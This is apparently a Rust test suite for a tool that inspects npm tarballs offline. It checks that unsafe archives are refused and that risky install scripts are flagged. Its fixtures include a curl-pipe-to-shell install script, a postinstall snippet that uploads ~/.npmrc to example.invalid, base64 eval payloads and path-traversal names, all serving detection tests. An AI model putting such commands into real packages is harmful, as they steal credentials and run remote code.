use super::*;
use flate2::{write::GzEncoder, Compression};
use std::io::Write;

const METADATA: &[u8] = br#"{"name":"fixture-package","version":"1.0.0"}"#;

fn header(name: &str, body: &[u8], kind: u8) -> [u8; 512] {
    assert!(name.len() <= 100);
    let mut header = [0u8; 512];
    header[..name.len()].copy_from_slice(name.as_bytes());
    header[100..108].copy_from_slice(b"0000644\0");
    header[108..116].copy_from_slice(b"0000000\0");
    header[116..124].copy_from_slice(b"0000000\0");
    header[124..136].copy_from_slice(format!("{:011o}\0", body.len()).as_bytes());
    header[136..148].copy_from_slice(b"00000000000\0");
    header[156] = kind;
    header[257..263].copy_from_slice(b"ustar\0");
    header[263..265].copy_from_slice(b"00");
    checksum(&mut header);
    header
}

fn checksum(header: &mut [u8; 512]) {
    header[148..156].fill(b' ');
    let sum: usize = header.iter().map(|b| usize::from(*b)).sum();
    header[148..156].copy_from_slice(format!("{sum:06o}\0 ").as_bytes());
}

fn append(tar: &mut Vec<u8>, name: &str, body: &[u8], kind: u8) {
    tar.extend_from_slice(&header(name, body, kind));
    tar.extend_from_slice(body);
    let padding = (512 - body.len() % 512) % 512;
    tar.resize(tar.len() + padding, 0);
}

fn finish(mut tar: Vec<u8>) -> Vec<u8> {
    tar.resize(tar.len() + 1024, 0);
    tar
}

fn gzip(bytes: &[u8]) -> Vec<u8> {
    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(bytes).unwrap();
    encoder.finish().unwrap()
}

fn package(metadata: &[u8], files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut tar = Vec::new();
    append(&mut tar, "package/package.json", metadata, b'0');
    for (name, bytes) in files {
        append(&mut tar, name, bytes, b'0');
    }
    gzip(&finish(tar))
}

fn inspect(bytes: &[u8]) -> NpmInspection {
    read_npm_tarball(bytes, "fixture-package-1.0.0.tgz", &NpmLimits::default())
}

fn assert_refused(bytes: &[u8], kind: NpmIssueKind) {
    let result = inspect(bytes);
    assert_eq!(result.archive_state, NpmArchiveState::Refused, "{result:?}");
    assert!(!result.coverage.archive_complete);
    assert!(!result.coverage.static_analysis_complete);
    assert!(
        result.files.is_empty(),
        "No content analyzer or partial inventory on structural refusal"
    );
    assert!(result.signals.is_empty());
    assert!(
        result
            .coverage
            .issues
            .iter()
            .any(|issue| issue.kind == kind),
        "{result:?}"
    );
}

fn pax_record(key: &str, value: &str) -> Vec<u8> {
    let body = format!(" {key}={value}\n");
    let mut len = body.len() + 1;
    loop {
        let next = body.len() + len.to_string().len();
        if next == len {
            return format!("{len}{body}").into_bytes();
        }
        len = next;
    }
}

#[test]
fn valid_package_retains_exact_transport_and_member_identities() {
    let js = b"module.exports=(a,b)=>a+b;";
    let bytes = package(METADATA, &[("package/index.js", js)]);
    let result = inspect(&bytes);
    assert_eq!(result.archive_state, NpmArchiveState::Accepted);
    assert!(result.coverage.archive_complete);
    assert!(result.coverage.metadata_complete);
    assert!(result.coverage.static_analysis_complete);
    assert!(result
        .coverage
        .analysis_scope
        .contains("behavior_not_proven"));
    assert_eq!(
        result.artifact.sha256,
        Some(hex::encode(Sha256::digest(&bytes)))
    );
    assert_eq!(result.artifact.compressed_bytes, Some(bytes.len() as u64));
    assert_eq!(result.artifact.name.as_deref(), Some("fixture-package"));
    assert_eq!(result.files[1].sha256, hex::encode(Sha256::digest(js)));
    assert!(result.signals.is_empty());
    assert_eq!(result.provenance_verification, "not_performed_offline");
    let json = serde_json::to_string(&result).unwrap();
    let restored: NpmInspection = serde_json::from_str(&json).unwrap();
    assert_eq!(result, restored);
    assert!(restored.check_schema());
}

#[test]
fn real_npm_pack_fixture_is_accepted_without_extracting_or_running_scripts() {
    let bytes = include_bytes!("../../tests/fixtures/npm/npm-11.19.0-portable-pax.tgz");
    let result = inspect(bytes);
    assert_eq!(
        result.artifact.sha256.as_deref(),
        Some("769755af559bda513cfe86d6c433bf8e6c0b2431dbb24955393e0dc69eeb2c0f")
    );
    assert_eq!(
        result.archive_state,
        NpmArchiveState::Accepted,
        "{result:?}"
    );
    assert!(result.coverage.archive_complete);
    assert!(result.coverage.metadata_complete);
    assert!(result.coverage.static_analysis_complete, "{result:?}");
    assert_eq!(result.files.len(), 4);
    assert!(result
        .files
        .iter()
        .any(|file| file.path.ends_with("résumé.js")));
    assert!(result
        .signals
        .iter()
        .all(|signal| signal.level == NpmSignalLevel::Observation));
}

#[test]
fn node_tar_pax_long_paths_unicode_sizes_and_metadata_are_supported() {
    let mut tar = Vec::new();
    append(
        &mut tar,
        "GlobalHead",
        &pax_record("comment", "node-tar compatible"),
        b'g',
    );
    append(&mut tar, "package/package.json", METADATA, b'0');
    let path = format!("package/{}résumé.js", "long-directory/".repeat(10));
    let mut pax = pax_record("path", &path);
    pax.extend(pax_record("size", "19"));
    pax.extend(pax_record("mtime", "1710000000.125"));
    pax.extend(pax_record("SCHILY.dev", "16777232"));
    pax.extend(pax_record("SCHILY.ino", "42"));
    pax.extend(pax_record("SCHILY.nlink", "1"));
    append(&mut tar, "PaxHeader/resume.js", &pax, b'x');
    let body = b"module.exports = 1;";
    assert_eq!(body.len(), 19);
    let mut entry = header("package/placeholder", b"", b'0');
    checksum(&mut entry);
    tar.extend(entry);
    tar.extend(body);
    tar.resize(tar.len() + 512 - body.len(), 0);
    let result = inspect(&gzip(&finish(tar)));
    assert_eq!(
        result.archive_state,
        NpmArchiveState::Accepted,
        "{result:?}"
    );
    assert_eq!(result.files[1].path, path);
    assert_eq!(result.files[1].size, 19);
}

#[test]
fn unsafe_portable_paths_are_refused_on_every_platform() {
    for path in [
        "../escape",
        "/absolute",
        "package/../escape",
        "package//x",
        "package/./x",
        "other/x",
        "package/a\\b",
        "package/C:evil",
        "package/NUL.txt",
        "package/COM¹.js",
        "package/file.",
        "package/file ",
        "package/SOURCE~1.JS",
        "package/x\u{7f}",
    ] {
        let mut tar = Vec::new();
        append(&mut tar, path, b"x", b'0');
        assert_refused(&gzip(&finish(tar)), NpmIssueKind::UnsafePath);
    }
}

#[test]
fn links_special_files_and_gnu_sparse_extensions_refuse_before_analysis() {
    for (kind, expected) in [
        (b'1', NpmIssueKind::LinkMember),
        (b'2', NpmIssueKind::LinkMember),
        (b'3', NpmIssueKind::SpecialMember),
        (b'4', NpmIssueKind::SpecialMember),
        (b'6', NpmIssueKind::SpecialMember),
        (b'S', NpmIssueKind::UnsupportedExtension),
        (b'L', NpmIssueKind::UnsupportedExtension),
        (b'K', NpmIssueKind::UnsupportedExtension),
    ] {
        let mut tar = Vec::new();
        append(&mut tar, "package/member", b"", kind);
        assert_refused(&gzip(&finish(tar)), expected);
    }
    let mut tar = header("package/setuid", b"", b'0');
    tar[100..108].copy_from_slice(b"0004755\0");
    checksum(&mut tar);
    assert_refused(&gzip(&finish(tar.to_vec())), NpmIssueKind::SpecialMember);
}

#[test]
fn duplicate_case_unicode_and_parent_collisions_are_refused() {
    for (first, second) in [
        ("package/a", "package/a"),
        ("package/A", "package/a"),
        ("package/café", "package/cafe\u{301}"),
        ("package/straße", "package/STRASSE"),
        ("package/σ", "package/ς"),
        ("package/a", "package/a/b"),
        ("package/a/b", "package/a"),
    ] {
        let mut tar = Vec::new();
        append(&mut tar, first, b"x", b'0');
        append(&mut tar, second, b"x", b'0');
        assert_refused(&gzip(&finish(tar)), NpmIssueKind::PathCollision);
    }
    let mut tar = Vec::new();
    append(&mut tar, "./package/dir/", b"", b'5');
    append(&mut tar, "package/dir/a.js", b"", b'0');
    append(&mut tar, "package/package.json", METADATA, b'0');
    assert_eq!(
        inspect(&gzip(&finish(tar))).archive_state,
        NpmArchiveState::Accepted
    );
}

#[test]
fn corrupt_headers_padding_and_terminators_do_not_claim_complete() {
    let mut tar = Vec::new();
    append(&mut tar, "package/package.json", METADATA, b'0');
    let good = finish(tar);
    let mut damaged = good.clone();
    damaged[0] ^= 1;
    assert_refused(&gzip(&damaged), NpmIssueKind::TarCorrupt);
    let mut damaged = good.clone();
    damaged[512 + METADATA.len()] = 1;
    assert_refused(&gzip(&damaged), NpmIssueKind::TarCorrupt);
    assert_refused(&gzip(&good[..good.len() - 512]), NpmIssueKind::TarCorrupt);
    let mut damaged = good.clone();
    *damaged.last_mut().unwrap() = 1;
    assert_refused(&gzip(&damaged), NpmIssueKind::TarCorrupt);
    let mut damaged = good.clone();
    damaged[257] = b'G';
    let mut head: [u8; 512] = damaged[..512].try_into().unwrap();
    checksum(&mut head);
    damaged[..512].copy_from_slice(&head);
    assert_refused(&gzip(&damaged), NpmIssueKind::UnsupportedTarFormat);
    let mut damaged = good;
    damaged[124] = 0x80;
    let mut head: [u8; 512] = damaged[..512].try_into().unwrap();
    checksum(&mut head);
    damaged[..512].copy_from_slice(&head);
    assert_refused(&gzip(&damaged), NpmIssueKind::TarCorrupt);
}

#[test]
fn gzip_crc_truncation_concatenation_and_trailing_bytes_are_refused() {
    let bytes = package(METADATA, &[]);
    let mut bad_crc = bytes.clone();
    let last = bad_crc.len() - 8;
    bad_crc[last] ^= 1;
    assert_refused(&bad_crc, NpmIssueKind::GzipCorrupt);
    assert_refused(&bytes[..bytes.len() - 1], NpmIssueKind::GzipCorrupt);
    let mut trailing = bytes.clone();
    trailing.push(0);
    assert_refused(&trailing, NpmIssueKind::GzipTrailingData);
    let mut concatenated = bytes.clone();
    concatenated.extend(&bytes);
    assert_refused(&concatenated, NpmIssueKind::GzipTrailingData);
}

#[test]
fn malformed_duplicate_global_and_unknown_pax_semantics_are_refused() {
    for (pax, kind, expected) in [
        (
            b"999 path=package/a\n".to_vec(),
            b'x',
            NpmIssueKind::InvalidPax,
        ),
        (
            [
                pax_record("path", "package/a"),
                pax_record("path", "package/b"),
            ]
            .concat(),
            b'x',
            NpmIssueKind::InvalidPax,
        ),
        (
            pax_record("GNU.sparse.size", "1024"),
            b'x',
            NpmIssueKind::UnsupportedExtension,
        ),
        (
            pax_record("path", "package/a"),
            b'g',
            NpmIssueKind::UnsupportedExtension,
        ),
        (pax_record("size", "-1"), b'x', NpmIssueKind::InvalidPax),
        (pax_record("size", "1.5"), b'x', NpmIssueKind::InvalidPax),
        (
            pax_record("size", "184467440737095516160"),
            b'x',
            NpmIssueKind::InvalidPax,
        ),
        (
            pax_record("hdrcharset", "BINARY"),
            b'x',
            NpmIssueKind::UnsupportedExtension,
        ),
        (
            pax_record("linkpath", "../../outside"),
            b'x',
            NpmIssueKind::UnsupportedExtension,
        ),
        (
            pax_record("path", "package/../outside"),
            b'x',
            NpmIssueKind::UnsafePath,
        ),
    ] {
        let mut tar = Vec::new();
        append(&mut tar, "PaxHeader/member", &pax, kind);
        append(&mut tar, "package/member", b"", b'0');
        assert_refused(&gzip(&finish(tar)), expected);
    }
    let mut tar = Vec::new();
    append(
        &mut tar,
        "PaxHeader/member",
        &pax_record("path", "package/a"),
        b'x',
    );
    assert_refused(&gzip(&finish(tar)), NpmIssueKind::TarCorrupt);
}

#[test]
fn input_caps_preserve_no_prefix_hash_and_read_at_most_cap_plus_one() {
    struct Counting {
        count: usize,
    }
    impl Read for Counting {
        fn read(&mut self, out: &mut [u8]) -> io::Result<usize> {
            out.fill(b'x');
            self.count += out.len();
            Ok(out.len())
        }
    }
    let mut input = Counting { count: 0 };
    let limits = NpmLimits {
        compressed_bytes: 7,
        ..NpmLimits::default()
    };
    let result = read_npm_tarball(&mut input, "x.tgz", &limits);
    assert_eq!(input.count, 8);
    assert_eq!(result.artifact.sha256, None);
    assert_eq!(result.artifact.compressed_bytes, None);
    assert_eq!(
        result.coverage.issues[0].kind,
        NpmIssueKind::CompressedLimit
    );
    let bytes = package(METADATA, &[]);
    let limits = NpmLimits {
        compressed_bytes: bytes.len(),
        ..NpmLimits::default()
    };
    assert_eq!(
        read_npm_tarball(bytes.as_slice(), "x.tgz", &limits).archive_state,
        NpmArchiveState::Accepted
    );
}

#[test]
fn decompression_ratio_header_member_and_path_limits_are_typed() {
    let bytes = package(METADATA, &[("package/a.js", b"hello")]);
    for (limits, expected) in [
        (
            NpmLimits {
                decompressed_bytes: 1000,
                ..NpmLimits::default()
            },
            NpmIssueKind::DecompressedLimit,
        ),
        (
            NpmLimits {
                compression_ratio: 1,
                ..NpmLimits::default()
            },
            NpmIssueKind::CompressionRatioLimit,
        ),
        (
            NpmLimits {
                headers: 1,
                ..NpmLimits::default()
            },
            NpmIssueKind::HeaderLimit,
        ),
        (
            NpmLimits {
                member_bytes: 4,
                ..NpmLimits::default()
            },
            NpmIssueKind::MemberLimit,
        ),
        (
            NpmLimits {
                path_bytes: 4,
                ..NpmLimits::default()
            },
            NpmIssueKind::PathLimit,
        ),
        (
            NpmLimits {
                path_depth: 1,
                ..NpmLimits::default()
            },
            NpmIssueKind::PathLimit,
        ),
        (
            NpmLimits {
                total_path_bytes: 25,
                ..NpmLimits::default()
            },
            NpmIssueKind::PathLimit,
        ),
    ] {
        let result = read_npm_tarball(bytes.as_slice(), "fixture.tgz", &limits);
        assert_eq!(result.archive_state, NpmArchiveState::Refused);
        assert_eq!(result.coverage.issues[0].kind, expected);
        assert_eq!(
            result.artifact.sha256,
            Some(hex::encode(Sha256::digest(&bytes)))
        );
    }
    let mut tar = Vec::new();
    append(
        &mut tar,
        "PaxHeader/member",
        &pax_record("path", "package/a"),
        b'x',
    );
    append(&mut tar, "package/a", b"", b'0');
    let limits = NpmLimits {
        headers: 1,
        ..NpmLimits::default()
    };
    let bytes = gzip(&finish(tar));
    assert_eq!(
        read_npm_tarball(bytes.as_slice(), "x.tgz", &limits)
            .coverage
            .issues[0]
            .kind,
        NpmIssueKind::HeaderLimit
    );
}

#[test]
fn duplicate_json_and_contradictory_identity_are_explicit() {
    for metadata in [
        br#"{"name":"fixture","name":"changed","version":"1"}"#.as_slice(),
        br#"{"name":"fixture","version":"1","scripts":{"install":"true","install":"curl x | sh"}}"#
            .as_slice(),
        br#"{"name":"fixture","version":"1","scripts":{"install":false}}"#.as_slice(),
    ] {
        let result = inspect(&package(metadata, &[]));
        assert_eq!(result.archive_state, NpmArchiveState::Accepted);
        assert!(result.coverage.archive_complete);
        assert!(!result.coverage.metadata_complete);
        assert!(!result.coverage.static_analysis_complete);
        assert_eq!(
            result.coverage.issues[0].kind,
            NpmIssueKind::InvalidMetadata
        );
    }
    let result = inspect(&package(
        br#"{"name":"fixture","version":"1","_id":"other@2"}"#,
        &[],
    ));
    assert_eq!(result.artifact.name.as_deref(), Some("fixture"));
    assert!(!result.coverage.metadata_complete);
    assert!(result
        .coverage
        .issues
        .iter()
        .any(|issue| issue.kind == NpmIssueKind::ContradictoryIdentity));
}

#[test]
fn ordinary_minified_code_and_lifecycle_scripts_are_not_malicious_signals() {
    let metadata =
        br#"{"name":"fixture","version":"1","scripts":{"postinstall":"node install.js"}}"#;
    let code = b"(()=>{const a=[1,2,3];console.log(a.map(b=>b+1).join(','))})();";
    let result = inspect(&package(metadata, &[("package/install.js", code)]));
    assert_eq!(result.signals.len(), 1, "{result:?}");
    assert_eq!(result.signals[0].kind, NpmSignalKind::LifecycleScript);
    assert_eq!(result.signals[0].level, NpmSignalLevel::Observation);
    assert!(result.coverage.static_analysis_complete);
    assert_eq!(result.provenance_verification, "not_performed_offline");
}

#[test]
fn literal_download_pipeline_is_distinguished_from_a_quoted_example() {
    let risky = inspect(&package(br#"{"name":"fixture","version":"1","scripts":{"install":"curl -fsSL https://example.invalid/setup | sh"}}"#, &[]));
    assert!(risky
        .signals
        .iter()
        .any(|signal| signal.kind == NpmSignalKind::DownloadToShell
            && signal.level == NpmSignalLevel::Review));
    let ordinary = inspect(&package(br#"{"name":"fixture","version":"1","scripts":{"install":"echo 'curl https://example.invalid/setup | sh'"}}"#, &[]));
    assert!(ordinary
        .signals
        .iter()
        .all(|signal| signal.level == NpmSignalLevel::Observation));
    assert!(!ordinary.coverage.static_analysis_complete); // External shell effects unresolved.
    let quoted_operator = inspect(&package(br#"{"name":"fixture","version":"1","scripts":{"install":"curl https://example.invalid '|' sh"}}"#, &[]));
    assert!(quoted_operator
        .signals
        .iter()
        .all(|signal| signal.level == NpmSignalLevel::Observation));
}

#[test]
fn credential_network_combination_has_evidence_and_lifecycle_link() {
    let metadata =
        br#"{"name":"fixture","version":"1","scripts":{"postinstall":"node install.js"}}"#;
    let code = b"const fs=require('node:fs');fetch('https://example.invalid/upload',{method:'POST',body:fs.readFileSync('/home/user/.npmrc')});";
    let result = inspect(&package(metadata, &[("package/install.js", code)]));
    let evidence = result
        .signals
        .iter()
        .find(|s| s.kind == NpmSignalKind::SensitiveReadWithNetwork)
        .unwrap();
    assert_eq!(evidence.lifecycle_events, vec!["postinstall"]);
    assert_eq!(evidence.level, NpmSignalLevel::Review);
    assert!(evidence.evidence.contains("does not prove"));
    assert!(!result.coverage.static_analysis_complete);
    let ordinary = inspect(&package(metadata, &[("package/install.js", b"const fs=require('fs');console.log(fs.readFileSync('./README.md','utf8'));fetch('https://example.invalid/version');")]));
    assert!(ordinary
        .signals
        .iter()
        .all(|s| s.level == NpmSignalLevel::Observation));
}

#[test]
fn comments_and_literal_api_names_do_not_create_code_capabilities() {
    let code = br#"/* require('fs');readFileSync('.npmrc');fetch('https://x');eval(Buffer.from('x','base64')) */ const example="require('child_process').exec('x')";"#;
    let result = inspect(&package(METADATA, &[("package/index.js", code)]));
    assert!(result.signals.is_empty(), "{result:?}");
    let encoded = inspect(&package(
        METADATA,
        &[(
            "package/index.js",
            b"eval(Buffer.from('Y29uc29sZS5sb2coMSk=','base64').toString());",
        )],
    ));
    assert!(encoded
        .signals
        .iter()
        .any(|s| s.kind == NpmSignalKind::EncodedDynamicExecution));
    assert!(encoded
        .coverage
        .issues
        .iter()
        .any(|i| i.kind == NpmIssueKind::DynamicCode));
}

#[test]
fn templates_dynamic_require_unsupported_code_and_nested_archives_are_incomplete() {
    for (name, code, issue) in [
        (
            "package/a.js",
            b"const a=`value ${run()}`;".as_slice(),
            NpmIssueKind::UnsupportedCode,
        ),
        (
            "package/a.js",
            b"require(process.env.MODULE);".as_slice(),
            NpmIssueKind::DynamicCode,
        ),
        (
            "package/a.ts",
            b"const a:number=1;".as_slice(),
            NpmIssueKind::UnsupportedCode,
        ),
        (
            "package/a.wasm",
            b"\0asm\x01\0\0\0".as_slice(),
            NpmIssueKind::UnsupportedCode,
        ),
        (
            "package/a.dat",
            b"PK\x03\x04nested".as_slice(),
            NpmIssueKind::NestedArchive,
        ),
    ] {
        let result = inspect(&package(METADATA, &[(name, code)]));
        assert!(result.coverage.archive_complete);
        assert!(!result.coverage.static_analysis_complete);
        assert!(
            result.coverage.issues.iter().any(|i| i.kind == issue),
            "{result:?}"
        );
    }
}

#[test]
fn explicit_main_and_lifecycle_targets_are_inspected_without_js_extension() {
    let metadata = br#"{"name":"fixture","version":"1","main":"payload.dat","scripts":{"install":"node payload.dat"}}"#;
    let result = inspect(&package(
        metadata,
        &[(
            "package/payload.dat",
            b"eval(Buffer.from('eA==','base64').toString());",
        )],
    ));
    assert_eq!(result.coverage.inspected_code_files, 1);
    assert!(result
        .signals
        .iter()
        .any(|s| s.kind == NpmSignalKind::EncodedDynamicExecution));
}

#[test]
fn oversized_excerpts_never_retain_a_partial_custom_secret_before_dlp() {
    let secret = format!("PRIVATE_START{}PRIVATE_END", "x".repeat(600));
    let metadata = serde_json::to_vec(&serde_json::json!({
        "name": "fixture", "version": "1.0.0", "scripts": { "postinstall": secret }
    }))
    .unwrap();
    let result = inspect(&package(&metadata, &[]));
    let evidence = &result
        .signals
        .iter()
        .find(|signal| signal.kind == NpmSignalKind::LifecycleScript)
        .unwrap()
        .evidence;
    assert!(!evidence.contains("PRIVATE_START"));
    assert!(evidence.contains("withheld"));
    let compiled = crate::redact::CompiledCustomPatterns::new_silent(std::slice::from_ref(&secret));
    let mut projected = serde_json::to_value(&result).unwrap();
    crate::redact::redact_json_strings(&mut projected, &compiled);
    let text = projected.to_string();
    assert!(!text.contains("PRIVATE_START"));
    assert!(!text.contains("PRIVATE_END"));
    let filename = format!("PRIVATE_START{}PRIVATE_END", "x".repeat(5000));
    let output = read_npm_tarball(
        package(METADATA, &[]).as_slice(),
        &filename,
        &NpmLimits::default(),
    );
    assert!(!output.artifact.filename.contains("PRIVATE_START"));
}

#[test]
fn code_metadata_and_signal_limits_keep_archive_identities_but_not_complete_claims() {
    let bytes = package(
        METADATA,
        &[
            ("package/a.js", b"fetch('https://example.invalid');"),
            ("package/b.js", b"eval('1');"),
        ],
    );
    for limits in [
        NpmLimits {
            code_member_bytes: 1,
            ..NpmLimits::default()
        },
        NpmLimits {
            code_files: 1,
            ..NpmLimits::default()
        },
        NpmLimits {
            total_code_bytes: 1,
            ..NpmLimits::default()
        },
        NpmLimits {
            signals: 0,
            ..NpmLimits::default()
        },
        NpmLimits {
            metadata_bytes: 1,
            ..NpmLimits::default()
        },
    ] {
        let result = read_npm_tarball(bytes.as_slice(), "fixture.tgz", &limits);
        assert!(result.coverage.archive_complete);
        assert!(!result.coverage.static_analysis_complete);
        assert_eq!(result.files.len(), 3);
        assert!(result.files.iter().all(|f| f.sha256.len() == 64));
    }
}

#[test]
fn native_presence_and_implicit_build_are_observations_and_partial_native_is_explicit() {
    let mut elf = vec![0u8; 64];
    elf[..7].copy_from_slice(b"\x7fELF\x02\x01\x01");
    elf[16..18].copy_from_slice(&3u16.to_le_bytes());
    elf[18..20].copy_from_slice(&62u16.to_le_bytes());
    elf[20..24].copy_from_slice(&1u32.to_le_bytes());
    elf[52..54].copy_from_slice(&64u16.to_le_bytes());
    elf[54..56].copy_from_slice(&56u16.to_le_bytes());
    elf[58..60].copy_from_slice(&64u16.to_le_bytes());
    let ordinary = inspect(&package(METADATA, &[("package/addon.node", &elf)]));
    assert!(ordinary
        .signals
        .iter()
        .any(|s| s.kind == NpmSignalKind::NativeArtifact));
    assert!(ordinary
        .signals
        .iter()
        .all(|s| s.level == NpmSignalLevel::Observation));
    let truncated = inspect(&package(METADATA, &[("package/addon.node", b"\x7fELF")]));
    assert!(truncated
        .coverage
        .issues
        .iter()
        .any(|i| i.kind == NpmIssueKind::NativeIncomplete));
    let build = inspect(&package(
        METADATA,
        &[("package/binding.gyp", br#"{"targets":[]}"#)],
    ));
    assert!(build.metadata.as_ref().unwrap().implicit_node_gyp_install);
    assert!(build
        .signals
        .iter()
        .any(|s| s.kind == NpmSignalKind::ImplicitNativeBuild));
    assert!(build
        .signals
        .iter()
        .all(|s| s.level == NpmSignalLevel::Observation));
}

#[test]
fn deterministic_malformed_corpus_never_panics_or_exceeds_reader_output_bounds() {
    // Deliberately independent of wall clock or rand: reproducible small-input
    // fuzz smoke corpus with valid gzip wrapping arbitrary tar-like bytes.
    let limits = NpmLimits {
        compressed_bytes: 8192,
        decompressed_bytes: 8192,
        member_bytes: 1024,
        headers: 8,
        signals: 4,
        ..NpmLimits::default()
    };
    let mut state = 0x9e3779b97f4a7c15u64;
    for iteration in 0..512usize {
        let mut bytes = vec![0u8; iteration % 4096];
        for byte in &mut bytes {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            *byte = state as u8;
        }
        let compressed = gzip(&bytes);
        for input in [bytes.as_slice(), compressed.as_slice()] {
            let result = read_npm_tarball(input, "fuzz.tgz", &limits);
            assert!(result.files.len() <= limits.headers);
            assert!(result.signals.len() <= limits.signals);
            assert!(result.coverage.issues.len() <= 256);
            assert!(!result.coverage.archive_complete);
        }
    }
}
